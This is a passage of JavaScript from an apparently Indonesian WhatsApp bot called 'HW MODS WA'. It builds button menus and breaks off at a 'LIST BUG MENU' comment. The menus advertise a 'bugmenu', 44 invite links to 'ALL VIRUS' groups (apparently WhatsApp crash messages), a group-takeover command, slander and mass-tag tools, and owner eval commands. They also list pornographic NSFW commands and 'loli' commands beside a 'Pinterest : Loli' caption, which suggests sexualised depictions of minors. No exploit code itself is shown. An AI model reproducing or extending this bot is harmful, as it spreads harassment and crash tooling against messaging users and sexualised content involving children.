						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}apa
▢🔥➥ ${prefix}loli
▢🔥➥ ${prefix}asw
▢🔥➥ ${prefix}opo
▢🔥➥ ${prefix}awkwk
▢🔥➥ ${prefix}kasian
▢🔥➥ ${prefix}kesel
▢🔥➥ ${prefix}ngeselin
▢🔥➥ ${prefix}keren
▢🔥➥ ${prefix}ketawa
▢🔥➥ ${prefix}hoax
▢🔥➥ ${prefix}bot
▢🔥➥ ${prefix}ikal
▢🔥➥ ${prefix}bacot

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `SCBOT`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break	
// LIST INTRO ( HW MODS WA )
case 'groupbot':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": -6.105394271969506,
						"degreesLongitude": 106.71700716018677
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
- INFO WHATSAPP HW MODS + BOT -
1. https://chat.whatsapp.com/IrDkkJGl2kn4vdJ2MWVVnt
2. https://chat.whatsapp.com/BfUhDS1wFuX62u9PeIOmdU

- INFO GROUP ALL VIRUS -

1. https://chat.whatsapp.com/GdbrLkRPZZq1RGSJrwRaj3
2. https://chat.whatsapp.com/EkUE7crS7ri7HFI5KFDOrh
3. https://chat.whatsapp.com/Fi4OvSr3RWTKS14HTthhQf
4. https://chat.whatsapp.com/GpGL3iieIWQB4OuhukQnuP
5. https://chat.whatsapp.com/HCZGPmB6yGh3a2Q7oOO5QT
6. https://chat.whatsapp.com/JNB42nhXvp4Dl4KKNw7x67
7. https://chat.whatsapp.com/CGgu2lChdK2LUPFLKhNrbC
8. https://chat.whatsapp.com/FsNnmTnl3gQ5p3ZnUMreFI
9. https://chat.whatsapp.com/CIFrfBJKiAS3g1zdPTUqYz
10. https://chat.whatsapp.com/IzeHF2PL4p3Auw9bcuMjmi
11. https://chat.whatsapp.com/EO2s0KL2DD2HcE75dQoe9f
12. https://chat.whatsapp.com/ENq7tp7GD9B7r4Sb0WEL5M
13. https://chat.whatsapp.com/BplIrSIakzb3PEojBK1lXg
14. https://chat.whatsapp.com/JQ6kJyW99L1BorQGsgpdyq
15. https://chat.whatsapp.com/JdcKjcv6dHP0Mg567uB9mo
16. https://chat.whatsapp.com/ByQz3wdiZwSKj8Gxu21aB5
17. https://chat.whatsapp.com/D7oNzDs4vsx0KfqYCoGKap
18. https://chat.whatsapp.com/KyQ3p8Eokv01IAzWHRFnJL
19. https://chat.whatsapp.com/HribVoY5sjU8YrqxZzzch6
20. https://chat.whatsapp.com/Hmks7s3MZLn5j5RiToClbo
21. https://chat.whatsapp.com/C6vnKGJQESTE2uTRcYi14C
22. https://chat.whatsapp.com/KairIwHsbJX0NZJyTPTNOU
23. https://chat.whatsapp.com/Dodbi0a9Rp2CV2VcSohrVH
24. https://chat.whatsapp.com/DnCO15NQu3TJVQBCn2iWEo
25. https://chat.whatsapp.com/JuzTiLV3WBUB9hPkjibG4r
26. https://chat.whatsapp.com/EypmOBm22FfJYHVodYQaom
27. https://chat.whatsapp.com/DQ614n3XGbCFHfZyb0QgCq
28. https://chat.whatsapp.com/F8g44snbkdhAnvd64wFGO6
29. https://chat.whatsapp.com/K2QZa966a100iaiw4xvC21
30. https://chat.whatsapp.com/E9I0gHmii1CAi3lT2MaVQx
31. https://chat.whatsapp.com/HnXQw7R1S168jketzHsUOR
32. https://chat.whatsapp.com/Bxw7gUegm4w5mrrsI7bOP6
33. https://chat.whatsapp.com/G5Vd5ZeJeGO2XHfD5Efenm
34. https://chat.whatsapp.com/KzCSiFbxIqY57HkKG4Ugsy
35. https://chat.whatsapp.com/JQUaFXT5qTi8FpeAvT3zuo
36. https://chat.whatsapp.com/IadgagK7y867n2sr5aX7pz
37. https://chat.whatsapp.com/EthZPeprbd5HfLyXUTMnl9
38. https://chat.whatsapp.com/BHKHkVfyAJ57C4vZrjIxAJ
39. https://chat.whatsapp.com/HxX9Xkv2SdtBgNZNKxd5G0
40. https://chat.whatsapp.com/CDnZ14fUjc88crWGMoYSLC
41. https://chat.whatsapp.com/IrnsezqUUdIILJMqRHXNZ0
42. https://chat.whatsapp.com/KPc1A0l9LKgBaGSonz7h7w
43. https://chat.whatsapp.com/FvDpvV9EuKGGnrIVDvMS4H
44. https://chat.whatsapp.com/LWdOZwI4Ncq2sRcntn1r4A
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
case 'intro':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
┏━━⊱
┣❏NAMA :   
┣❏UMUR :  
┣❏KOTA : 
┣❏NEGARA :
┣❏ALASAN BERGABUNG :
┣❏PASANGAN :
┗━━⊱
┏━━⊱
┣❏🔥➥ WELCOME BOT
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// List Menu
case 'menu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭

- COMMAND MENU -
┏━━⊱
┣❏🔥➥ HACKTAE <kudeta>
┣❏🔥➥ Menu
┣❏🔥➥ ${prefix}asupanboy
┣❏🔥➥ ${prefix}quotes
┣❏🔥➥ ${prefix}owner
┣❏🔥➥ ${prefix}makermenu
┣❏🔥➥ ${prefix}makerkal
┣❏🔥➥ ${prefix}lolivideo
┣❏🔥➥ ${prefix}menunsfw
┣❏🔥➥ ${prefix}bugmenu
┣❏🔥➥ ${prefix}groupbot
┣❏🔥➥ ${prefix}menusound
┣❏🔥➥ ${prefix}intro
┣❏🔥➥ ${prefix}me
┣❏🔥➥ ${prefix}kemiripan
┣❏🔥➥ ${prefix}hwmenu
┣❏🔥➥ ${prefix}modsmenu
┣❏🔥➥ ${prefix}kodekeras
┣❏🔥➥ ${prefix}mausange
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱
┣❏🔥➥ ALL MENU ONLY BUTTON
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `SCBOT`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `OWNER`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
case 'menunsfw':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
								"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": ` NSFW
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▬▭▬▭▬▭▬▭▬▬▭▬▭
│◦➛${prefix}trapnime
│◦➛${prefix}neko
│◦➛${prefix}megumin
│◦➛${prefix}blowjob
│◦➛${prefix}hentai
│◦➛${prefix}awoo
│◦➛${prefix}bj 
│◦➛${prefix}eroneko
│◦➛${prefix}lesbian
│◦➛${prefix}anal
│◦➛${prefix}yuri
│◦➛${prefix}baka
│◦➛${prefix}neko2
│◦➛${prefix}wallpaper
│◦➛${prefix}pussy
│◦➛${prefix}kitsune
│◦➛${prefix}keta
│◦➛${prefix}neko2
│◦➛${prefix}poke
│◦➛${prefix}slap
│◦➛${prefix}komiku [ query ]
│◦➛${prefix}otaku [ query ]
│◦➛${prefix}chara [ query ]

NOTE :🔥➥ ${prefix}nsfw [ 1/0 ]
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `SCBOT`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
//LIST MODS MENU
case 'modsmenu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
							"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU MODS -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
═════{*SETTINGS MENU*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}setthumb <reply>
┣❏🔥➥ ${prefix}settarget <62xxxx>
┣❏🔥➥ ${prefix}setfakeimg <reply>
┣❏🔥➥ ${prefix}setreply <query>
┣❏🔥➥ ${prefix}setname <query>
┣❏🔥➥ ${prefix}setdesc <query>
┣❏🔥➥ ${prefix}emoji <emoji>
┣❏🔥➥ ${prefix}tts id <reply>
┣❏🔥➥ ${prefix}setprefix <query>
┣❏🔥➥ ${prefix}setlink <query>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU HW -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭

┏━━⊱
═════{*GROUP MENU*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}antilink <1/0>
┣❏🔥➥ ${prefix}groupinfo [Info]
┣❏🔥➥ ${prefix}revoke [Revoke]
┣❏🔥➥ ${prefix}linkgc [Link Group]
┣❏🔥➥ ${prefix}group <open/close>
┣❏🔥➥ ${prefix}add <62xxxx>
┣❏🔥➥ ${prefix}kick <tag>
┣❏🔥➥ ${prefix}sider <reply>
┣❏🔥➥ ${prefix}getbio <reply>
┣❏🔥➥ ${prefix}bc <query>
┣❏🔥➥ ${prefix}setbio <quey>
┣❏🔥➥ ${prefix}promote <reply>
┣❏🔥➥ ${prefix}demote <reply>
┣❏🔥➥ ${prefix}demoteall
┣❏🔥➥ ${prefix}getname <reply>
┣❏🔥➥ ${prefix}promoteall
┣❏🔥➥ ${prefix}getpic <query>
┣❏🔥➥ ${prefix}getp [From]
┣❏🔥➥ ${prefix}get <link>
┣❏🔥➥ ${prefix}q [Copy Paste]
┣❏🔥➥ ${prefix}listadmin <link>
┣❏🔥➥ ${prefix}inspect <link>
┣❏🔥➥ ${prefix}searchtext <query>
┣❏🔥➥ ${prefix}searchgc <query>
┣❏🔥➥ ${prefix}penjara <nama group>
┗━━⊱
┏━━⊱
═════{*GAME MENU*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}tictactoe <@tag>
┣❏🔥➥ ${prefix}cekhistory [Status]
┣❏🔥➥ ${prefix}delsesi <game>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU WA -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
═════{*COMMAND*}═════
┏━━⊱
┣❏🔥➥ => [eval async]
┣❏🔥➥ > [eval]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
case 'kemiripan':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
								"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!

TESTING KEMIRIPAN MUKA ANDA :v
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `GANTENG`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `CANTIK`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `KEREN`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
//List Hw Menu
case 'hwmenu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
							"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU MODS -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
═════{*OWNER*}═════
┏━━⊱
├ ❏🔥➥ ${prefix}leave <id>
├ ❏🔥➥ ${prefix}self [Self]
├ ❏🔥➥ ${prefix}public [Public]
├ ❏🔥➥ ${prefix}off <query>
├ ❏🔥➥ ${prefix}intro [intro]
├ ❏🔥➥ ${prefix}on [Online]
├ ❏🔥➥ ${prefix}ban <target>
├ ❏🔥➥ ${prefix}status [Status]
├ ❏🔥➥ ${prefix}antibug <on/off>
├ ❏🔥➥ ${prefix}antitag <on/off>
├ ❏🔥➥ ${prefix}autoread <query>
├ ❏🔥➥ ${prefix}anticall <on/off>
├ ❏🔥➥ ${prefix}antidelete <on/off>
├ ❏🔥➥ ${prefix}join <link>
├ ❏🔥➥ ${prefix}restart [Restart]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU HW -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭

┏━━⊱
═════{*UP STORY*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}upswteks <query>
┣❏🔥➥ ${prefix}upswimage <image>
┣❏🔥➥ ${prefix}upswvideo <video>
┗━━⊱
┏━━⊱
═════{*TAG*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}tag <62xxxx>
┣❏🔥➥ ${prefix}tagall <query>
┣❏🔥➥ ${prefix}tagall3 <query>
┣❏🔥➥ ${prefix}hidetag <query>
┣❏🔥➥ ${prefix}kontag <62xxxx>
┣❏🔥➥ ${prefix}sticktag <reply>
┣❏🔥➥ ${prefix}totag <reply>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU WA -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
═════{*DOWNLOAD*}═════
┏━━⊱
┣❏🔥➥ ${prefix}ytsearch <query>
┣❏🔥➥ ${prefix}playstore <query>
┣❏🔥➥ ${prefix}igstalk <query>
┣❏🔥➥ ${prefix}play <query>
┣❏🔥➥ ${prefix}video <query>
┣❏🔥➥ ${prefix}ytmp3 <link>
┣❏🔥➥ ${prefix}ytmp4 <link>
┣❏🔥➥ ${prefix}ig <link>
┣❏🔥➥ ${prefix}tinyurl <link>
┣❏🔥➥ ${prefix}twmp4 <link>
┣❏🔥➥ ${prefix}twmp3 <link>
┣❏🔥➥ ${prefix}ttmp4 <link>
┣❏🔥➥ ${prefix}ttmp3 <link>
┣❏🔥➥ ${prefix}fbmp4 <link>
┣❏🔥➥ ${prefix}fbmp3 <link>
┣❏🔥➥ ${prefix}brainly <query>
┣❏🔥➥ ${prefix}image <query>
┣❏🔥➥ ${prefix}toimg <reply>
┣❏🔥➥ ${prefix}tomp3 <reply>
┣❏🔥➥ ${prefix}tovoice <reply>
┣❏🔥➥ ${prefix}tomp4 <reply>
┣❏🔥➥ ${prefix}slow <reply>
┣❏🔥➥ ${prefix}kalkulator <kalkulator>
┣❏🔥➥ ${prefix}fast <reply>
┣❏🔥➥ ${prefix}reverse <reply>
┣❏🔥➥ ${prefix}tourl <reply>
┗━━⊱
┏━━⊱
═════{*OTHER*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}blocklist [List]
┣❏🔥➥ ${prefix}listgroup [List]
┣❏🔥➥ ${prefix}term <code>
┣❏🔥➥ ${prefix}owner [Owner]
┣❏🔥➥ ${prefix}d [Clear]
┣❏🔥➥ ${prefix}deletepc [Clear]
┣❏🔥➥ ${prefix}delchat [Clearchat]
┣❏🔥➥ ${prefix}hbd <date>
┣❏🔥➥ ${prefix}slander <query>
┣❏🔥➥ ${prefix}mute
┣❏🔥➥ ${prefix}unmute
┣❏🔥➥ ${prefix}slanderpm <query>
┣❏🔥➥ ${prefix}kontak <62xxxx>
┣❏🔥➥ ${prefix}styletext <query>
┣❏🔥➥ ${prefix}nowa <628xxxx>
┣❏🔥➥ ${prefix}sticker <image/video>
┣❏🔥➥ ${prefix}size <quey>
┣❏🔥➥ ${prefix}swm <author|packname>
┣❏🔥➥ ${prefix}take <author|packname>
┣❏🔥➥ ${prefix}colong <author|packname>
┣❏🔥➥ ${prefix}fdeface <reply>
┣❏🔥➥ ${prefix}detikvn <query>
┣❏🔥➥ ${prefix}detikvideo <query>
┣❏🔥➥ ${prefix}tohuruf <query>
┣❏🔥➥ ${prefix}fliptext <query>
┣❏🔥➥ ${prefix}volume <query>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// LIST BUG MENU
